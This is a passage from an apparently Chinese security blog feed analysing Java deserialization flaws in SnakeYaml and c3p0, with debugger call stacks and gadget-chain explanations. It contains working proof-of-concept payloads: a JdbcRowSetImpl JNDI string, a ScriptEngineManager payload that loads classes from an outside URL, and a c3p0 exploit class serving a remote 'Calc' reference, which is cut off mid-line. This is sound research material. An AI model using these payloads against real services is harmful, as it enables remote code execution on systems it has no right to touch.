  Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; beanType = node.getType();  </span><br><span class="line">    List&lt;NodeTuple&gt; nodeValue = node.getValue();  </span><br><span class="line">    <span class="keyword">for</span> (NodeTuple tuple : nodeValue) &#123;  </span><br><span class="line">        ScalarNode keyNode;  </span><br><span class="line">        <span class="keyword">if</span> (tuple.getKeyNode() <span class="keyword">instanceof</span> ScalarNode) &#123;  </span><br><span class="line">            <span class="comment">// key must be scalar  </span></span><br><span class="line">            keyNode = (ScalarNode) tuple.getKeyNode();  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(  </span><br><span class="line">                    <span class="string">&quot;Keys must be scalars but found: &quot;</span> + tuple.getKeyNode());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Node</span> <span class="variable">valueNode</span> <span class="operator">=</span> tuple.getValueNode();  </span><br><span class="line">        <span class="comment">// keys can only be Strings  </span></span><br><span class="line">        keyNode.setType(String.class);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> (String) constructObject(keyNode);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">TypeDescription</span> <span class="variable">memberDescription</span> <span class="operator">=</span> typeDefinitions.get(beanType);  </span><br><span class="line">            <span class="type">Property</span> <span class="variable">property</span> <span class="operator">=</span> memberDescription == <span class="literal">null</span> ? getProperty(beanType, key)  </span><br><span class="line">                    : memberDescription.getProperty(key);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (!property.isWritable()) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;No writable property &#x27;&quot;</span> + key + <span class="string">&quot;&#x27; on class: &quot;</span>  </span><br><span class="line">                        + beanType.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            valueNode.setType(property.getType());  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">typeDetected</span> <span class="operator">=</span> (memberDescription != <span class="literal">null</span>)  </span><br><span class="line">                    ? memberDescription.setupPropertyType(key, valueNode)  </span><br><span class="line">                    : <span class="literal">false</span>;  </span><br><span class="line">            <span class="keyword">if</span> (!typeDetected &amp;&amp; valueNode.getNodeId() != NodeId.scalar) &#123;  </span><br><span class="line">                <span class="comment">// only if there is no explicit TypeDescription  </span></span><br><span class="line">                Class&lt;?&gt;[] arguments = property.getActualTypeArguments();  </span><br><span class="line">                <span class="keyword">if</span> (arguments != <span class="literal">null</span> &amp;&amp; arguments.length &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                    <span class="comment">// type safe (generic) collection may contain the  </span></span><br><span class="line">                    <span class="comment">// proper class                    </span></span><br><span class="line">                    <span class="keyword">if</span> (valueNode.getNodeId() == NodeId.sequence) &#123;  </span><br><span class="line">                        Class&lt;?&gt; t = arguments[<span class="number">0</span>];  </span><br><span class="line">                        <span class="type">SequenceNode</span> <span class="variable">snode</span> <span class="operator">=</span> (SequenceNode) valueNode;  </span><br><span class="line">                        snode.setListType(t);  </span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Set.class.isAssignableFrom(valueNode.getType())) &#123;  </span><br><span class="line">                        Class&lt;?&gt; t = arguments[<span class="number">0</span>];  </span><br><span class="line">                        <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) valueNode;  </span><br><span class="line">                        mnode.setOnlyKeyType(t);  </span><br><span class="line">                        mnode.setUseClassConstructor(<span class="literal">true</span>);  </span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(valueNode.getType())) &#123;  </span><br><span class="line">                        Class&lt;?&gt; keyType = arguments[<span class="number">0</span>];  </span><br><span class="line">                        Class&lt;?&gt; valueType = arguments[<span class="number">1</span>];  </span><br><span class="line">                        <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) valueNode;  </span><br><span class="line">                        mnode.setTypes(keyType, valueType);  </span><br><span class="line">                        mnode.setUseClassConstructor(<span class="literal">true</span>);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> (memberDescription != <span class="literal">null</span>)  </span><br><span class="line">                    ? newInstance(memberDescription, key, valueNode)  </span><br><span class="line">                    : constructObject(valueNode);  </span><br><span class="line">            <span class="comment">// Correct when the property expects float but double was  </span></span><br><span class="line">            <span class="comment">// constructed            </span></span><br><span class="line">            <span class="keyword">if</span> (property.getType() == Float.TYPE || property.getType() == Float.class) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Double) &#123;  </span><br><span class="line">                    value = ((Double) value).floatValue();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="comment">// Correct when the property a String but the value is binary  </span></span><br><span class="line">            <span class="keyword">if</span> (property.getType() == String.class &amp;&amp; Tag.BINARY.equals(valueNode.getTag())  </span><br><span class="line">                    &amp;&amp; value <span class="keyword">instanceof</span> <span class="type">byte</span>[]) &#123;  </span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">String</span>((<span class="type">byte</span>[]) value);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (memberDescription == <span class="literal">null</span>  </span><br><span class="line">                    || !memberDescription.setProperty(object, key, value)) &#123;  </span><br><span class="line">                property.set(object, value);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (DuplicateKeyException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> e;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(  </span><br><span class="line">                    <span class="string">&quot;Cannot create property=&quot;</span> + key + <span class="string">&quot; for JavaBean=&quot;</span> + object,  </span><br><span class="line">                    node.getStartMark(), e.getMessage(), valueNode.getStartMark(), e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> object;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809004030.png" alt="image.png"></p><p>可以看见又使用constructObject对键进行了构造, 之后获取JavaBean的property, 把value构造出来放进去, 依然是使用constructObject方法<br>最后将value set进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809004548.png" alt="image.png"></p><p>两个问题</p><ol><li>property如何被获取的</li><li>property.set内部如何给属性赋值的</li></ol><p>这个property是org.yaml.snakeyaml.introspector.MethodProperty类型</p><p>set方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809010808.png" alt="image.png"><br>发现内部包装的是一个<code>PropertyDescriptor</code></p><p>跟进getWriteMethod方法, </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809010930.png" alt="image.png"></p><p>this.writeMethodRef已经存在这个set方法</p><p>搜索this.writeMethodRef.set, 发现有setWriteMethod, 打上断点<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809011013.png" alt="image.png"></p><p>重新运行, 强制运行到此处, 可以看到调用栈是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setWriteMethod:<span class="number">321</span>, PropertyDescriptor (java.beans)</span><br><span class="line">&lt;init&gt;:<span class="number">161</span>, PropertyDescriptor (java.beans)</span><br><span class="line">getTargetPropertyInfo:<span class="number">522</span>, Introspector (java.beans)</span><br><span class="line">getBeanInfo:<span class="number">428</span>, Introspector (java.beans)</span><br><span class="line">getBeanInfo:<span class="number">173</span>, Introspector (java.beans)</span><br><span class="line">getPropertiesMap:<span class="number">83</span>, PropertyUtils (org.yaml.snakeyaml.introspector)</span><br><span class="line">getProperty:<span class="number">152</span>, PropertyUtils (org.yaml.snakeyaml.introspector)</span><br><span class="line">getProperty:<span class="number">148</span>, PropertyUtils (org.yaml.snakeyaml.introspector)</span><br><span class="line">getProperty:<span class="number">309</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructJavaBean2ndStep:<span class="number">230</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">171</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">331</span>, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:<span class="number">229</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:<span class="number">13</span>, testYaml (org.n4c1.unserial)</span><br></pre></td></tr></table></figure><p>可以看见是getProperty的时候就set了<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809011328.png" alt="image.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a><code>JdbcRowSetImpl</code></h3><p>JdbcRowSetImpl打jndi, 老把戏了, 就是调用setter<br>poc: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:1389/pvscac, autoCommit: true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809155555.png" alt="image.png"><br>具体流程有了之前的调试也很清楚了, 不必多说</p><h3 id="ScriptEngineManager-gadget"><a href="#ScriptEngineManager-gadget" class="headerlink" title="ScriptEngineManager gadget"></a>ScriptEngineManager gadget</h3><p>yaml反序列化时可以通过!!+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造ScriptEngineManagerpayload并利用[[SPI机制]]机制通过URLClassLoader或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。</p><p>[[SPI机制]]<br>Java 原生 SPI:</p><p>Java 从 6 版本开始提供了原生的 SPI 机制，它的实现方式相对简单和直接。</p><p><strong>工作流程</strong>：</p><ol><li><p><strong>定义服务接口</strong>：首先，你需要定义一个公共的服务接口（如 <code>com.example.Logger</code>）。</p></li><li><p><strong>提供服务实现</strong>：服务提供方创建该接口的具体实现类（如 <code>com.example.FileLogger</code>）。</p></li><li><p><strong>创建配置文件</strong>：在服务实现的 JAR 包的 <code>META-INF/services/</code> 目录下，创建一个以<strong>接口全限定名</strong>为名的文件。</p><ul><li><p>文件名：<code>com.example.Logger</code></p></li><li><p>文件内容：<code>com.example.FileLogger</code>（每行一个实现类名）</p></li></ul></li><li><p><strong>应用程序加载</strong>：应用程序在运行时，通过 <code>java.util.ServiceLoader</code> 来加载服务。<code>ServiceLoader</code> 会扫描 <code>META-INF/services/</code> 目录，找到对应的文件，然后通过反射加载文件里指定的实现类。</p></li></ol><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://f80226cf33.ipv6.1433.eu.org\&quot;]]]]\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>为什么使用<code>ScriptEngineManager</code>?<br>ScriptEngineManager这个类原本是用来在 Java 应用程序中<code>发现</code>、<code>实例化</code>和<code>管理</code>脚本引擎(Script Engine)的, 类似用于管理不同jdbc实现的<code>java.sql.DriverManager</code>类, 他们都是SPI机制中的一部分, 但在ScriptEngineManager这个类中, 直接加载构造器参数传来的类导致了这一利用产生</p><h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>我们找到这个类, 断点打在构造方法</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809230457.png" alt="image.png"><br>可以看见注释写的很清楚, 这个构造器会使用参数指定的类加载器来加载ScriptEngineFactory接口的实现, 知道这些其实就可以利用了, 后面的调用栈这里就不再记录了</p><p>对于恶意的实现, 参考项目<br><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a><br>可以直接利用</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/LittleHann/p/17828948.html">SnakeYaml反序列化漏洞研究</a><br><a href="https://tttang.com/archive/1815/">SnakeYaml反序列化及不出网利用</a><br><a href="https://forum.butian.net/share/4486">SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SnakeYaml反序列化&quot;&gt;&lt;a href=&quot;#SnakeYaml反序列化&quot; class=&quot;headerlink&quot; title=&quot;SnakeYaml反序列化&quot;&gt;&lt;/a&gt;SnakeYaml反序列化&lt;/h1&gt;&lt;h2 id=&quot;Yaml规范&quot;&gt;&lt;a href=&quot;#Yam</summary>
      
    
    
    
    <category term="JavaSec" scheme="http://example.com/categories/JavaSec/"/>
    
    
    <category term="SnakeYaml" scheme="http://example.com/tags/SnakeYaml/"/>
    
  </entry>
  
  <entry>
    <title>c3p0利用</title>
    <link href="http://example.com/2025/09/10/c3p0%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2025/09/10/c3p0%E5%88%A9%E7%94%A8/</id>
    <published>2025-09-10T06:55:56.000Z</published>
    <updated>2025-09-10T07:39:52.823Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><h2 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h2><blockquote><p>C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。<br>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。  </p><p>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p><p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p><h2 id="URLClassLoader远程类加载"><a href="#URLClassLoader远程类加载" class="headerlink" title="URLClassLoader远程类加载"></a>URLClassLoader远程类加载</h2></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject -&gt; </span><br><span class="line">ReferenceSerialized.getObject -&gt; </span><br><span class="line">ReferenceableUtils.referenceToObject-&gt;</span><br><span class="line">fClass.newInstance()</span><br></pre></td></tr></table></figure><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>入口在<code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713143306.png" alt="image.png"></p><p>如上图, 如果反序列化得到的是<code>IndirectlySerialized</code>的实例, 则强制转为<code>IndirectlySerialized</code>类型并调用其<code>getObject</code>方法, 并将<code>getObject</code>返回的对象强制转换为<code>ConnectionPoolDataSource</code>类型</p><p>因此这过程其实是为了得到<code>this.connectionPoolDataSource</code>这个属性, 之所以有这样一个过程, 是因为<code>ConnectionPoolDataSource</code>本身是没有实现<code>Serializable</code>接口的, 无法直接反序列化</p><p>既然是通过<code>IndirectlySerialized.getObject</code>得来的, 那就去看这个接口的实现类</p><p>发现只有这一个实现类, 就是<code>com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713144444.png" alt="image.png"></p><p>那么基本可以断定一开始的<code>((IndirectlySerialized) o).getObject();</code>实际上就是调用的<code>ReferenceSerialized.getObject</code></p><p>可以在writeObject中看看序列化的过程是不是与此对应<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713144851.png" alt="image.png"></p><p>可以看见先尝试直接序列化<code>connectionPoolDataSource</code>, 抛出错误时则捕获并实例一个<code>ReferenceIndirector</code>对<code>connectionPoolDataSource</code>进行包装再序列化</p><p>而<code>ReferenceIndirector</code>正是使用了其内部类<code>ReferenceSerialized</code>, <code>indirectForm</code>返回的是一个<code>ReferenceSerialized</code>对象</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713145150.png" alt="image.png"></p><p>所以序列化写入的也是<code>ReferenceSerialized</code>对象, 反序列化时自然读取的是<code>ReferenceSerialized</code>对象, 调用<code>ReferenceSerialized.getObject</code></p><p>所以第一段就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject -&gt; </span><br><span class="line">ReferenceSerialized.getObject -&gt; </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>再来看<code>ReferenceSerialized.getObject</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713144444.png" alt="image.png"></p><p>看其他师傅说<code>nameContext = (Context) initialContext.lookup( contextName );</code>这里是没法利用的, 因为<code>默认为null</code></p><p>那么就是看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return ReferenceableUtils.referenceToObject( reference, name, nameContext, env );</span><br></pre></td></tr></table></figure><p>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713151146.png" alt="image.png"><br>直接是一个远程加载类<br>url是从</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">fClassLocation</span> <span class="operator">=</span> ref.getFactoryClassLocation();</span><br></pre></td></tr></table></figure><p>读取的</p><p>可以去看看<code>ref</code>的来源, 其实就是<code>connectionPoolDataSource</code>的引用</p><p>反序列化时:<br>从引用中尝试还原<code>connectionPoolDataSource</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713151405.png" alt="image.png"></p><p>序列化时:<br>获取引用进行序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713161709.png" alt="image.png"></p><p><code>orig</code>就是不可直接序列化的<code>connectionPoolDataSource</code>, 通过序列化其引用来完成</p><p>在这个过程中, 引用是完全可控的, 且反序列化时未进行校验, 导致漏洞产生</p><h3 id="构造利用连"><a href="#构造利用连" class="headerlink" title="构造利用连"></a>构造利用连</h3><p>由于序列化时传入的是一个引用, 和并不校验被引用的类, 因此可以自定义一个类反返回恶意的引用<br>exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exp.c3p0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urlClassLoadExp</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXPLoader</span> <span class="keyword">implements</span> <span class="title class_">Referenceable</span>, ConnectionPoolDataSource &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> getPoolBackedDataSource();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  </span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);  </span><br><span class="line">  </span><br><span class="line">        unserial();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PoolBackedDataSourceBase <span class="title function_">getPoolBackedDataSource</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">EXPLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EXPLoader</span>();  </span><br><span class="line">        <span class="comment">// use pulic constructor  </span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span 